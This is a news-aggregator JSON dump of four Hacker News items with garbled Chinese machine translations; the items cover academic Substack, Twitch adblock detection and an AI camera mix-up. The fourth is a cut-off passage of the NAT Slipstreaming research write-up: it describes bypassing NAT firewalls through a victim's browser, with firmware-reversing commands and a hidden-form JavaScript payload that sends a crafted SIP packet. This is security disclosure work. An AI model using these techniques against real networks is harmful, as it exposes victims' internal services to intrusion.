[{"category": "", "categoryclass": "", "imagename": "9d9c919f7c4f3d5882c71dd97179709a.jpeg", "infoid": 1032566, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "我很幸运成为一名在德国一所小大学工作的美国教授。我很幸运的一个原因是，我在这里的工作是一份教学工作，除了我自己选择做的事情之外，没有繁重的出版配额或参与研究的要求。\n但我在业余时间做的学术工作经常没有发表，因为我们研究人员可用的媒体已经过时，过于排外，或者受制于市场需求，与真正的科学不相容。我想传播这一信息，但我不愿将我的辛勤工作贡献给一个如此排外的系统。\n我可能说错了，但在我看来，Substack已经击中了数字出版的最佳位置，使其成为未来学术出版模式的候选者。\n通常，研究和实验结果将发表在学术期刊上，这些期刊的内容将提供给作者的同行以供(进一步)广泛审查。其他研究人员可能会选择以专著的形式出版作品，这样可以更有创意和更详细地呈现作品。\n不太关心细节或严谨的作者还可以通过medium.com、个人博客甚至Twitter等非正式在线媒体发布自己的作品。这些在学术出版的背景下有明显的限制；特别是缺乏同行评议或推动最受欢迎的平台的商业压力。\n这些媒体都不是十全十美的，但我认为，如果学术出版采用堆叠式模式，对每种媒体的最大批评都可以消除。\n获取期刊的费用高得令人望而却步，因此独立研究人员几乎无法获得。此外，订阅或数字下载的收入没有与那些产生按需科学数据的人公平分享。\n除了学术出版商鼓励的财务壁垒外，作为已发表作品的贡献者、审查者或消费者，参与进来往往存在事实上的障碍。没有关系的学者，甚至是那些隶属于错误的机构的学者，可能会被拒绝接触到最相关和最新的工作。\n最后，审查过程本身可能会受到知识保护主义，甚至是无意的把关，这会阻止研究接触到更广泛的受众，从而帮助想法成长。由同一领域的专家审阅的专家文献似乎是一种直观上正确的验证方式，但真正的跨学科工作和广泛的研究需要开放的专家领域。更具批判性的眼光-即使是对专业文学-培养了更严格的态度和一种知识上的交叉分化，这是当代出版的堡垒模式所阻止的。\n这三大缺陷在科学期刊出版中表现得最为明显。专著和数字自助出版的其他缺陷是显而易见的，但似乎不会对国际学术表达的健康构成如此严重的威胁。例如，长篇大论和肤浅是细心的读者可以自己解决的问题。\n学术出版的子栈模型可以避免上述三个陷阱。这种媒体是免费提供的，除了基本的互联网访问之外，不会设置任何访问障碍，同时还可以邀请甚至来自不相关领域的用户检查和回应内容。如果跨科学学科使用学术分栈，创新合作和强有力的审查的潜力将以在现有制度下难以想象的方式加强学术出版。通达与合作是这一媒介的强项，也是一般科学的基础。\n请随时与我联系，因为我鼓励我的同事参与这个努力做到开放、自由、严格和包容的新论坛。", "note_en": "I’m fortunate to be an American professor working at a small university in Germany. One reason I’m fortunate is because my position here is a  teaching job with no burdensome publication quotas or demands to participate in research beyond that which I choose to do myself.\n But the academic work I have done on my own time frequently remains unpublished, since the media available to us researchers are obsolete, overly exclusive or subject to market demands incompatible with real science. I want to spread the word, but I prefer not to contribute my hard work to a system that is so exclusionary.\n I may be way off here, but it seems to me that  Substack has hit a digital publishing sweet spot that makes it a candidate for the academic publishing model of the future.\n  Generally, research and experimental results will be published in  academic journals whose content is made available to the authors’ peers for (further) extensive scrutiny. Other researchers may choose to publish works in the form of a  monograph which allows for more creative and detailed presentation of the work.\n Authors less concerned with detail or rigor may furthermore publish their work themselves via  informal online media such as  medium.com, personal blogs or even Twitter. These have obvious limitations in the context of academic publishing; specifically a lack of peer review or commercial pressures that drive the most popular platforms.\n None of these media is perfect, but, I would argue, the greatest criticism of each medium can be eliminated if academic publishing were to adopt a Substack-type model.\n  Access to journals is  prohibitively expensive and therefore practically unavailable to independent researchers. Furthermore, the revenue from subscriptions or digital downloads is  not fairly shared with those who generate the in-demand scientific data.\n Apart from the financial walls that academic publishers encourage, there are frequently de facto  barriers to participation as a contributor, reviewer, or consumer of published work. Unaffiliated scholars or even those who are attached to the wrong institutions may be  denied access to the most relevant and up-to-date work.\n Finally, the review process itself may be subject to  intellectual protectionism and even  unintentional gatekeeping that prevents research from reaching a broader audience that can help the ideas grow. Specialist literature reviewed by specialists from the same field may seem like an intuitively correct way to verify, but real interdisciplinary work and broad studies require an open field of experts. More critical eyes - even on the specialist literature - foster greater rigor and a kind of intellectual cross-pollenation that the fortress model of contemporary publishing prevents.\n These three major flaws are most evident in the context of scientific journal publication. Other flaws in monograph and digital self-publishing are apparent, but don’t seem to be such serious threats to the health of international academic expression. Long-windedness and superficiality, for example, are problems that careful readers can solve for themselves.\n A  Substack model for academic publishing  could avoid the three traps described above. This medium is  freely available - costing nothing and  placing no barriers to access beyond basic Internet access - while also inviting  users even from unrelated fields to examine and respond to content. If  Academic Substack were used across scientific disciplines, the potential for innovative collaboration and robust review would strengthen academic publication in ways difficult to imagine under the present regime. Access and cooperation are this medium’s great strength and the foundation of science generally.\n Feel free to contact me as I encourage my colleagues to participate in this new forum that strives to be open, free, rigorous, and inclusive.", "posttime": "2020-11-01 09:01:25", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "免费,开放,substack,出版", "title": "学术子堆栈：开放、免费和接受审查", "title_en": "Academic Substack: Open, Free, and Subject to Review", "transed": 1, "url": "https://jfmcdonald.substack.com/p/academic-substack-open-free-and-subject", "via": "", "real_tags": ["免费", "开放", "substack", "出版"]}, {"category": "", "categoryclass": "", "imagename": "02166673018def82efda8ad369d33126.jpg", "infoid": 1032564, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "级别1如果您正在使用任何广告阻止和/或可能的BTTV，您可能会从twitch收到此消息。\n感谢您的收看！您可能正在使用影响站点性能的第三方工具或浏览器扩展。要获得最佳的抽搐体验，请访问twitch.tv并支持该流。如果您已经在看twitch.tv，请查看您的第三方工具。", "note_en": "level 1  If you are using any adblock and/or possibly BTTV you may get this message from twitch\n Thanks for Watching!  You may be using a third party tool or browser extension that is impacting site performance. For the best twitch experience, head over to   twitch.tv  and support the stream.  If you&#39;re already watching   twitch.tv , please review your third party tools.", "posttime": "2020-11-01 08:32:42", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "广告,检测,detects,twitch", "title": "Twitch检测到并告诉您停止使用广告拦截器", "title_en": "Twitch detects and tells you to stop using adblockers", "transed": 1, "url": "https://www.reddit.com/r/LivestreamFail/comments/jlqw2u/clip_unrelated_twitch_detects_and_tells_you_to/gaqiyoi/", "via": "", "real_tags": ["广告", "检测", "detects", "twitch"]}, {"category": "", "categoryclass": "", "imagename": "e9f2bc1bc169d6c0a02fe97326f20f34.jpg", "infoid": 1032561, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "科技和体育的关系已经相当复杂了。在足球比赛期间登录Twitter(也就是人们熟知的足球)，人们在推特上发一些模棱两可的声明，比如“哦，不，伙计”，再到大约2万条莫名其妙的转发，你很可能会看到很多人抱怨视频助理裁判(VAR)，偶尔还会看到球门线技术不力的抱怨。\n苏格兰足球队因弗内斯喀里多尼亚蓟足球俱乐部的球迷在上周末的一场比赛中经历了一个新的滑稽的技术故障，但老实说，你很难说这并没有显著改善观看体验。\n该俱乐部几周前宣布，将从使用人类相机操作员转向由人工智能控制的相机。俱乐部当时自豪地宣布，新的Pixellot系统使用内置人工智能球跟踪技术的摄像头，将用于捕捉喀里多尼亚体育场所有主场比赛的高清镜头，并将直接播放给季票持有者的家庭。\n切换到上周六，当时机器人摄像机面临着一个新的挑战，这是一个没有预料到的挑战：一名秃头的巡边员。\n人工智能摄像机似乎在比赛的大部分时间里把这名男子的秃头误认为是球，反复向后摇摆，跟随巡边员，而不是实际的比赛。许多观众抱怨他们错过了球队的进球，因为摄像机一直认为里诺的光头就是球，一些人甚至建议俱乐部必须为这名边裁提供头饰或帽子。\n由于新冠肺炎的限制，体育场内不允许球迷入场，因弗内斯喀里多尼亚蓟足球俱乐部的球迷和他们的对手艾尔联队的球迷只能通过摄像机观看，所以他们得到的待遇主要是看到这位边裁的头部，而不是镜头外发生的任何激动人心的时刻，尽管一些球迷认为这是一种额外的奖励，因为它有着不同寻常的表现质量。\n正如你可以从上面的高光卷轴上看到的那样，人工智能操作的摄像机一直跟随着巡边员的头部，特别是当球落到他附近的地面时，他特别挣扎。你几乎可以听到它的思维过程：圆球光头，那里有一个光头，放大这个光头。\n物体识别技术显然需要做一些调整，否则球队实际上可能不得不实施秃顶裁判被迫穿上宽边帽的政策，以使自己与球区分开来。\n*如果你知道IFLScience的总部设在英国，而不是美国，可能会让你大吃一惊。", "note_en": "Technology and sports have a fairly mixed relationship already. Log on to Twitter during a soccer match (or football as it&#39;s properly known*) and as well as people tweeting ambiguous statements like &#34;YESSS&#34; and &#34;oh no mate&#34; to about 20,000 inexplicable retweets, you&#39;ll likely see a lot of complaints about the video assistant referee (VAR) and occasionally goal-line technology not doing its job.\n Fans of Scottish football team Inverness Caledonian Thistle FC experienced a new hilarious technological glitch during a match last weekend, but in all honesty, you&#39;d be hard-pressed to say it didn&#39;t improve the viewing experience dramatically.\n The club announced a few weeks ago it was moving from using human camera operators to cameras controlled by AI. The  club proudly announced at the time the new &#34;Pixellot system uses cameras with in-built, AI, ball-tracking technology&#34; and would be used to capture HD footage of all home matches at Caledonian Stadium, which would be broadcast directly to season-ticket holders&#39; homes.\n Cut to last Saturday, when the robot cameras were given a new challenge that hadn&#39;t been foreseen: A linesman with a bald head.\n  The AI camera appeared to mistake the man&#39;s bald head for the ball for a lot of the match, repeatedly swinging back to follow the linesman instead of the actual game. Many viewers  complained they missed their team scoring a goal because the camera &#34;kept thinking the Lino bald head was the ball,&#34; and some even suggested the club would have to provide the linesman with a toupe or hat.\n With no fans allowed in the stadium due to Covid-19 restrictions, the fans of Inverness Caledonian Thistle FC and their opponents Ayr United could only watch via the cameras, and so were treated to mostly a view of the linesman&#39;s head instead of any exciting moments of the match that were occurring off-camera, though some fans saw this as a bonus given the usual quality of performance.\n   As you can see from the highlight reel above, the AI-operated camera continuously follows the linesman&#39;s head, particularly struggling as the ball falls down towards the ground near him. You can practically hear its thought process: &#34;ball ball ball bald head, there&#39;s a bald head, zoom in on the bald head.&#34;\n The object recognition technology could clearly do with a bit of a tweak, or else the team might actually have to implement the policy of bald referees being forced to wear a sombrero to differentiate themselves from the ball.\n  *It may surprise you to know IFLScience is based in the UK, not the US.", "posttime": "2020-11-01 07:37:37", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "摄像机,camera,球迷", "title": "AI摄像机将裁判的光头误认为球后毁了足球比赛", "title_en": "AI Camera Ruins Soccer Game After Mistaking Referee's Bald Head for Ball", "transed": 1, "url": "https://www.iflscience.com/technology/ai-camera-ruins-soccar-game-for-fans-after-mistaking-referees-bald-head-for-ball", "via": "", "real_tags": ["摄像机", "camera", "球迷"]}, {"category": "", "categoryclass": "", "imagename": "d5a4e607eab13b28426ef364b6f65844.png", "infoid": 1032560, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "NAT滑流允许攻击者仅通过受害者访问网站，绕过受害者的NAT/防火墙(任意防火墙针孔控制)，远程访问绑定到受害者计算机的任何TCP/UDP服务。\n使用我的Draw.io分支生成，允许在动画中进行可导出的边缘上下文流和控制。\nNAT滑流通过定时攻击或WebRTC链接内部IP提取、自动远程MTU和IP分段发现、TCP数据包大小消息传送、TURN身份验证误用、精确的数据包边界控制以及通过浏览器滥用造成的协议混乱，将用户浏览器与NAT、路由器和防火墙中内置的应用层网关(ALG)连接跟踪机制结合使用。\n从2020年起，它可以在所有主要的现代(以及更老的)浏览器上运行，并且是我从2010年开始使用的原始NAT锁定技术的现代化版本(在DEFCON18+Black Hat 2010上展示)。这要求NAT/防火墙支持ALG(应用层网关)，这对于可以使用多个端口(控制信道+数据信道)的协议(例如SIP和H323(VoIP协议)、FTP、IRC DCC等)是强制的。\n它还包含新的技术，用于发现受害者的本地IP地址，并迫使受害者通过访问页面的用户在TCP和UDP数据包中传输任意数据。\n受害者的内部IP首先必须由浏览器提取并发送到服务器有些浏览器(Chrome)只通过HTTPS上的WebRTC泄露本地IP，但是我们的一些攻击需要HTTP，所以我们首先重定向到攻击软件的HTTPS版本来提取本地IP。\n然后，如果我们能够获得URL中包含本端IP的HTTP版本以绕过其他跨域保护机制(提供的.local mDNS/Bonjour地址将不会对攻击有用)，我们会将其重定向到该URL中包含本端IP的HTTP版本。\n如果WebRTC(Safari)未泄露内部IP或没有WebRTC(&lt；=IE11)，如果网关返回任何TCP RST(或SYN+HTTP响应)，则会执行基于Web的TCP计时攻击，我们已检测到有效子网\n对检测到的子网(/24)上的所有IP重新执行计时攻击，测量onerror/onSuccess触发的时间。\n响应最快的可能是内部IP，尽管所有响应都被视为受害者内部IP候选并受到攻击。\n通过隐藏形式和自动HTTP POST发送到绑定到非标准端口的攻击者HTTP服务器的大型TCP信标，以强制发现受害者的IP堆栈攻击者的TCP分段和最大MTU大小TCP服务器发送最大分段大小TCP选项来通知受害者出站数据包大小(RFC 793x3.1)，从而允许控制浏览器TCP数据包的大小。\n通过WebRTC从浏览器发送的大型UDP信标将身份验证机制转换为非标准端口到攻击者的服务器，以强制IP分段，并填充TURN用户名字段。我们执行与TCP分段类似的攻击，但在UDP上会发生IP分段，并提供与TCP分段不同的值。\n受害者MTU大小、IP报头大小、IP数据包大小、TCP报头大小、TCP数据段大小由服务器检测并发送回受害者的浏览器，稍后用于数据包填充。\n&#34；SIP数据包&#34；以新的隐藏形式生成，包含内部IP以触发应用程序级网关连接跟踪&#34；HTTP POST&34；到TCP端口5060(SIP端口)启动的服务器，避免了受限的浏览器端口。\nPOST数据被填充以精确的TCP数据段大小/数据包边界，然后附加“SIP数据包”并通过Web表单发布。\n受害者IP堆栈将POST分解为多个TCP数据包，将SIP数据包(作为POST数据的一部分)留在其自己的TCP数据包中，没有任何HTTP报头\n如果浏览器更改了多部分/表单边界(Firefox)的大小或由于任何其他原因更改了数据包大小，则大小更改会传回客户端，并且客户端会使用新的大小自动重新发送。\n当打开UDP端口时，SIP数据包通过TURN协议在巧尽心思构建的用户名字段内发送，强制IP分段和精确的边界控制。\n受害者NAT在SIP端口(没有HTTP数据)上看到正确的SIP REGISTER数据包，触发ALG打开返回受害者NAT的数据包中定义的任何TCP/UDP端口，重写SIP数据包，将内部IP替换为公共IP，提示攻击者攻击成功。\n即使受害者NAT正常重写源端口，ALG仍将被迫将端口转发到攻击者选择的端口，因为ALG相信受害者机器打开了该端口，并且攻击者在到达的SIP数据包中看到新的源端口。\n攻击者现在可以绕过受害者NAT，直接连接回受害者计算机上的任何端口，从而暴露以前受保护/隐藏的服务。\n我们使用NAT(网络地址转换)有几个原因。NAT最有用的功能是允许在多个系统之间共享单个公有IP地址。它通过创建本地网络，向所有连接的计算机提供本地IP地址来实现这一点，当其中一个系统连接到Internet时，它会重写外出的数据包以使用公共IP，以便响应返回到NAT，反之亦然，将目标IP重写到特定客户端的IP。\nNAT有责任区分来自内部主机的到相同地址/端口(google.com：443)的连接，因为它们的出站端口、目的IP和源IP最终都将是相同的。如果两个不同的内部对等项尝试从同一源端口连接，则现代NAT会改变其中一个源端口(某些网络会对所有TCP/UDP源端口执行此操作)。\n构建在Netfilter框架之上的一个重要功能是连接跟踪。连接跟踪允许内核跟踪所有逻辑网络连接或会话，从而将组成该连接的所有数据包关联起来。NAT依靠此信息以相同方式转换所有相关数据包，iptables可以使用此信息充当状态防火墙。\n如果NAT后的机器将数据包发送出去，并且您的路由器希望远程主机做出响应，则它会跟踪信息，特别是源和目的端口、源和目的IP地址以及您的内部IP，然后将任何与其匹配的数据包返回给您的内部IP。\n如果LAN上的另一台主机尝试使用相同的源和目标端口+IP建立相同的连接，您的NAT将无法区分它，因此它会更改源端口，但在发回给您时会将其重写。\nALG允许NAT跟踪多端口协议(如FTP)从您的系统传出到FTP服务器，然后跟踪当您请求将文件发送到特定端口上的内部IP时，ALG可以重写数据包以包括您的公共IP，然后将FTP的服务器连接转发回您。如果没有重写您的IP，FTP服务器将尝试在您的内部IP上连接回您(或者，如果它希望源IP与信令连接相同，则根本不尝试)。\n在计算机联网的上下文中，应用层网关由安全组件组成，该安全组件增强了计算机网络中采用的防火墙或NAT。它允许将定制的NAT穿越过滤器插入网关，以支持特定应用层协议(如FTP、BitTorrent、SIP、RTSP、IM应用程序中的文件传输等)的地址和端口转换。为了使这些协议通过NAT或防火墙，应用程序必须知道允许传入数据包的地址/端口号组合，或者NAT必须根据需要监控控制流量并动态打开端口映射(防火墙针孔)。因此，合法的应用程序数据可以通过防火墙或NAT的安全检查，否则会因为不满足其有限的过滤标准而限制流量。\n我首先想看看普通网关实际上是如何处理数据包和FTP、SIP等多端口协议的。要做到这一点，我们需要对普通路由器的固件进行反向工程。我们可以从物理路由器上转储闪存，但是，如果我们可以从制造商那里获得未加密的固件，我们将能够更快地调查更多的路由器型号。\n我们将从一款常见的路由器Netkit Nighthawk R7000开始。快速搜索可帮助我们找到带有最新固件的Netkit文章。下载固件并解压缩后，我们发现一个名为R7000-V1.0.9.64_10.2.64.chk的30MB文件。\n虎血：~c/ng$wget http://www.downloads.netgear.com/files/GDC/R7000/R7000-V1.0.9.64_10.2.64.zip--2019-05-19 19：21：13--http://www.downloads.netgear.com/files/GDC/R7000/R7000-V1.0.9.64_10.2.64.zipResolving www.downloads.netgear.com(www.downloads.netgear.com)...。104.69.65.243连接www.downloads.netgear.com(www.downloads.netgear.com)|104.69.65.243|：80...。已连接。已发送HTTP请求，正在等待响应...。200OK长度：31705064(30M)[应用程序/压缩]保存至：‘R7000-V1.0.9.64_10.2.64.zip’R7000-V1.0.9.64_10.2.64.zip 100%[=&gt；]30.24M 6.25MB/s in 11s2019-05-19 19：21：24(2.83MB/s)-‘R7000-V1.0.9.64_10.2.64.zip’保存[31705064/31705064]虎血：~c/ng$unzip R7000-V1.0.9.64_10.2.64.zip存档：R7000-V1.0.9.64_10.2.64.zip解压：R7000-V1.0.9.64_10.2.64.chk充气：R7000-。V1.0.9.64_10.2.64_Release_Notes.htmltigerblood：~c/ng$文件R7000-V1.0.9.64_10.2.64.chkR7000-V1.0.9.64_10.2.64.chk：数据指示器血液：~c/ng$ls-LH R7000-V1.0.9.64_10.2.64.chk-rw-r--r--1 SAMY员工30M Mar 26 11：46 R7000-V1.0.9.64_10.2.64.chk。\nFile命令没有检测到任何魔术信息，所以我们可以使用binwalk来扫描文件中的嵌套数据。\n虎血：~c/ng$binwald R7000-V1.0.9.64_10.2.64.chkDECIMAL十六进制DESCRIPTION----58 0x3A Trx固件标头，小端，图像大小：31703040字节，CRC32：0xBEF1BB2F，标志：0x0，版本：1，标头大小：28字节，加载器偏移量：0x1C，linux内核偏移量：0x21E3F0，根文件偏移量：0x086 0x56 lzma压缩数据，属性：0x5D，字典大小：65536字节，解压缩大小：5436416字节2221098 0x21E42A Squashfs文件系统，小端，Version 4.0，压缩：xz，大小：29475437字节，1988年inode，块大小：131072字节，创建时间：2018年-12-26 04：15：38。\n我使用MacOS，而binwalk依赖于一些开箱即用的Linux应用程序，这会导致binwalk-e(解压文件)失败，所以我手动解压(还有I&lt；3Perl Golf)。\n你可以使用dd，但是你想要一个很大的bs(块大小)，这样它可以快速输出，例如1024，但是跳过属性(告诉它从squashfs blob的位置开始)会考虑块大小，在我的头脑中，除了2…之外，很明显2221098不能快速整除。现在我很好奇。\n虎血：~c/ng$time dd if=R7000-V1.0.9.64_10.2.64.chk SKIP=$((2221098/2))bs=2 of=squash.fs214741000+0记录在14741000+0记录输出29482000字节，传输时间为78.363403秒(376222字节/秒)实际1m18.385s用户0m12.553ssys 1m4.451s。\n现在让我们解开压缩文件系统。我已经创建了一个分支squashfs--在MacOS上运行并支持LZO的工具。您可能还需要安装XZ和LZO。或者，您可以在Linux上使用Sasquatch。\n泰格布拉德：~c/ng$sudo port install XZ lzo...tigerred：~c/ng$git克隆https://github.com/samyk/squashfs-tools&amp；&amp；cd squashfs-Tools/squashfs-tools&amp；&amp；sudo make&amp；&amp；sudo make install&amp；&amp；cd../.。\n虎血：~c/ng$unsquashfs-l-no squash.fs并行unsquashfs：对writesquashfs-rootsquashfs-root/binsquashfs-root/bin/addgroup...使用8个处理器1881inode(2535block)。(更多文件)...tigerred：~c/ng$cd squashfs-root&amp；&amp；lsbin data dev etc lib media mnt opt proc sbin share sys tmp usr var www。\n现在让我们看看我们是否能找到任何与FTP相关的文件，因为它是一个经常使用的协议，所以ALG支持将在路由器上泛滥。我使用我的g工具，它只是对egrep进行方便的包装。\n没有什么有趣的东西，所以让&#39；g表示内容与/ftp/匹配的二进制文件，忽略一些我们不关心的文件。\n默认情况下，g递归扫描当前工作目录。-l仅打印文件名(因为它们大多是二进制文件)，-a扫描二进制文件，ftp查找要匹配的文本，-v&#39；\\.(HTML？|js|gif)$|www/|bin/&#39；忽略web文件和可执行文件(位于bin/中)。\n好的，两个感兴趣的文件-lib/lib/modules/2.6.36.4brcmarm+/kernel/lib/br_dns_hijack.ko/tdts.ko可能是相关的，而模块可能不相关，但听起来很有趣！以后可能会对此进行调查。\n虎血：~c/ng/squashfs-root$filelib/MODLES/tdts.kolib/MODLES/tdts.ko：ELF 32位LSB可重定位，ARM，EABI5版本1(SYSV)，BuildID[sha1]=0aa35748e245e60273ceb5a48641e424d069235b，Not strippedtigerred：~c/ng/squashfs-root$string lib/MODLES/tdts.ko|g ftpftp_decoder_openftp_decoder_closeftp_decode_epsv_respftp_decode_eprt_cmdftp_decode_pasv_respftp_decodeftp_decode_port_cmdftp_decodercheck_ftp_ft_rule。\n好的!。如果内核对象(.ko)具有ftp函数，并且带有类似端口之类的字词，则它可能与FTP ALG相关。FTP RFC 959解释了PORT命令的含义：\n数据端口(端口)该参数是要在数据连接中使用的数据端口的主机端口规范。用户和服务器数据端口都有默认值，正常情况下不需要此命令及其回复。如果使用此命令，参数是32位Internet主机地址和16位TCP端口地址的串联。此地址信息被分成8位字段，每个字段的值以十进制数的形式传输(输入字符串表示)。字段之间用逗号分隔。端口命令将是：端口h1、h2、h3、h4、p1、p2，其中h1是互联网主机地址的高位8位。\n虽然我们已经找到了一些FTP功能，但我们更感兴趣的是我们可以使用的端口。现代浏览器阻止出站HTTP(S)连接到许多受限端口，包括FTP，因此滥用FTP ALG可能是行不通的。\n2010年，当我第一次演示NAT钉住时，我通过DCC聊天/文件消息使用了端口6667(IRC)。很快，浏览器供应商封锁了6667…端口。虽然有些人使用uint32(32位无符号整数)来存储端口，但请检查端口是否被阻塞，如果没有，则连接。要避免这一点，重要的是要注意tcp端口是16位长，因此如果您将2**16(65536)添加到所选的受限端口(在本例中为65536+6667=72203)，浏览器将存储72203，它将通过端口限制(72203！=6667)，然后将被发送到tcp堆栈，在那里它被截断为16位，这就是我们想要的受限端口！\n我们可以使用我的Diffits工具更好地查看它，这是一个简单的工具，用于查看位串之间以及多组位串之间的异同，对于逆转专有的二进制协议很有用。\n继续打开您选择的反汇编程序。我已经使用了我们在美国国家安全局的朋友提供的Ghidra，因为它是免费和开源的。\n我们通过字符串在tdts.ko中看到的一些函数是ftp_decode和ftp_decder，因此其他ALG可能会有_decode函数。让我们看看…。\n检查我们的受限浏览器端口，我们看到默认的SIP端口5060在Chrome中不受限制：)。\nSIP驻留在TCP/UDP 5060上，但是像RTP(音频)这样的媒体是在动态生成的备用端口上发送的。在发送SIP呼叫请求时，您的SIP客户端会选择一个随机端口，将其打开，并将其包含在SIP标头中。假设SIP ALG已启用(并且默认情况下在大多数路由器上)，您的NAT也应该看到它并将其打开。\n假设NAT阅读器SIP数据包逐行(SIP像HTTP一样基于newline，不是二进制协议)，那么它可能会忽略HTTP报头，一旦到达POST数据，就读取寄存器并认为它是SIP数据包。这在我们2010版本的IRC DCC中起作用。NAT忽略HTTP报头，仅解析IRC DCC命令。\n有趣的是，这还允许访问我们站点的用户实际连接到合法的irc服务器，加入通道，并在他们不知道的情况下从他们的IP发送消息！：P I演示这种在端口25被浏览器阻止和SPF记录成为常见的…之前使用客户端IP地址向邮件服务器发送电子邮件的技术。太疯狂了。\n现在，在一个快速测试中，通过HTTP post通过端口5060发送SIP register数据包似乎不能用于…。也许我们在包裹里漏掉了什么。\n//我们的sip messagevar sipmsg=&#39；register sip：samy.pl；Transport=TCPSIP/2.0\\r\\n&39；联系人：在iFrame中使用&lt；sip:samy@192.168.0.109:1234；transport=TCP&gt；\\r\\n\\r\\n&#39；//加载表单，这样用户就不会在iFrame=document.createElement(&#39；iframe&#39；)iframe.name=&#39；iframe&#39；iframe.style.display=&#39；无&#39；//隐藏IFRAME//创建Formvar Form=document.createElement(&#39；form&#39；)form.setAttribute(&#39；target&#39；，&#39；IFRAME&39；)//加载到IFrameform.setAttribute(&#39；method&#39；，&#39；post&#39；)//需要可以添加CRLFsform.setAttribute(&#39；action&#39；，&#39；http://samy.pl:5060&#39；)的POST区域。)//&#34；http&#34；服务器位于SIP端口5060form.setAttribute(&#39；enctype&#39；，&#39；multipart/form-data&#39；)//确保我们的数据不会被编码dar texttarea=document.createElement(&#39；textarea&#39；)textarea.setAttribute(&#39；name&#39；，&#39；TextName&#39；)//Required dtextarea.innerHTML=sipmsgform.appendChild(textarea)document.body.appendChild(iframe)document.body.appendChild(form)form.submit()。\n$unbuffer tcpdump-X端口5060|h2bPOST/HTTP/1.1主机：samy.pl：5060Connection：Keep-aliveContent-Length：191Cache-Control：max-age=0Origin：http://samy.plUpgrade-Insecure-Requests：1内容类型：多部分/表单数据；boundary=----WebKitFormBoundaryhcoAd2iSAx3TJA7AUser-Agent：Mozilla/5.0(Macintosh；Intel Mac OS X 10_14_4)AppleWebKit/537.36(KHTML，如壁虎)Chrome/75.0.3770.66Safari/537.36接受：文本/HTML，应用程序/xhtml+xml，应用程序/xml；Q=0.9，IMAGE/WebP，IMAGE/APNG，*/*；q=0.8，应用程序/签名交换；v=b3参考：http://samy.pl/o/sp.htmlAccept-Encoding：gzip，deducateAccept-Language：EN-US，en；q=0.9-WebKitFormBoundaryhcoAd2iSAx3TJA7AContent-Disposition：Form-Data；Name=&#34；textname&#34；register sip：samy.pl；Transport=TCPSIP/2.0联系：&lt；sip:samy@192.168.0.109:1234；transport=TCP&gt；-WebKitFormBoundaryhcoAd2iSAx3TJA7A--。\n然而，这并没有打开端口，IP也没有像我们预期的那样被重写(稍后将详细介绍)，所以我们一定遗漏了什么。\n让我们继续挖掘内核对象。在反汇编中，我们看到来自SIP包的&#34；SIP/2.0&34；标记，因此它很可能在这里解析(“解码”听起来像这样)。\n啊，这就是我们失败的原因。看起来它在INVITE上运行strncasecmp(寄存器上类似的解析)-匹配(不区分大小写，这很有趣，因为SIP INVITE是大写的)数据包开头的单词&#34；invite&#34；和分支if不等于(Arm Assembly Bne)为0，所以如果单词确实匹配，则词典顺序将为0，我们将继续使用ct_sip_get_header，这听起来很有趣，否则似乎可以省略。\n这就是问题所在(The Problem…)。虽然我们可以使用Web浏览器生成出站套接字(TCP通过HTTP(S)，UDP通过TURN w/WebRTC)，但我们对浏览器没有足够的控制能力，无法使用此模块期望的单词&#34；INVITE&34；开始TCP数据部分。在2010IRC版本中，IRC ALG只逐行查找，忽略所有HTTP头数据，然后在POST数据中使用换行符发送有效的“IRC DCC”。但是，这个SIP ALG要严格得多，并且不可能控制请求的开头。如果使用TLS，\n.", "note_en": "NAT Slipstreaming allows an attacker to remotely access any TCP/UDP service bound to a victim machine, bypassing the victim&#39;s NAT/firewall (arbitrary firewall pinhole control), just by the victim visiting a website.\n    generated with  my fork of  draw.io, allowing exportable edge context flow &amp; control in animations\n    NAT Slipstreaming exploits the user&#39;s browser in conjunction with the Application Level Gateway (ALG) connection tracking mechanism built into NATs, routers, and firewalls by chaining internal IP extraction via timing attack or WebRTC, automated remote MTU and IP fragmentation discovery, TCP packet size massaging, TURN authentication misuse, precise packet boundary control, and protocol confusion through browser abuse.\n This works across all major modern (and older) browsers as of 2020, and is a modernized version to my original  NAT Pinning technique from 2010 (presented at DEFCON 18 + Black Hat 2010). This requires the NAT/firewall to support ALG (Application Level Gateways), which are mandatory for protocols that can use multiple ports (control channel + data channel) such as SIP and H323 (VoIP protocols), FTP, IRC DCC, etc.\n This also contains new techniques for discovering a victim&#39;s local IP address and forcing the victim to transmit arbitrary data in TCP and UDP packets by the user visiting a page.\n  internal IP of victim first must be extracted by browser and sent to server some browsers (Chrome) only divulge the local IP via WebRTC over HTTPS but some of our attacks require HTTP so we first redirect to the HTTPS version of the attack software to extract the local IP\n we then redirect to the HTTP version with the local IP included in the URL if we were able to obtain it to bypass other cross-origin protection mechanisms (the  .local mDNS/Bonjour address presented will not be useful for the attack)\n if internal IP not divulged by WebRTC (Safari) or no WebRTC (&lt;= IE11),  web-based TCP timing attack performed if any TCP RST returned by gateway (or SYN + HTTP response), we&#39;ve detected valid subnet\n re-perform timing attack across all IPs on detected subnets (/24), measuring time to onerror/onsuccess firing\n fastest response is likely internal IP, though all responses are considered victim internal IP candidates and attacked\n large TCP beacon sent via hidden form and automatic HTTP POST to attacker &#34;HTTP server&#34; bound to a non-standard port to force TCP segmentation and maximum MTU size discovery of the victim&#39;s IP stack attacker TCP server sends  Maximum Segment Size TCP Option to massage victim outbound packet sizes ( RFC 793 x3.1), allowing control of how large browser TCP packets will be\n large UDP beacon sent from browser via WebRTC TURN authentication mechanism to non-standard port to attacker&#39;s server to force IP fragmentation with TURN  username field stuffed we perform a similar attack as our TCP segmentation, but over UDP as IP fragmentation will occur and provide different values than TCP segmentation\n victim MTU size, IP header size, IP packet size, TCP header size, TCP segment sizes detected by server and sent back to victim&#39;s browser, used later for packet stuffing\n &#34;SIP packet&#34; in new hidden form generated, containing internal IP to trigger Application Level Gateway connection tracking &#34;HTTP POST&#34; to server on TCP port 5060 (SIP port) initiated, avoiding  restricted browser ports\n POST data is &#34;stuffed&#34; to 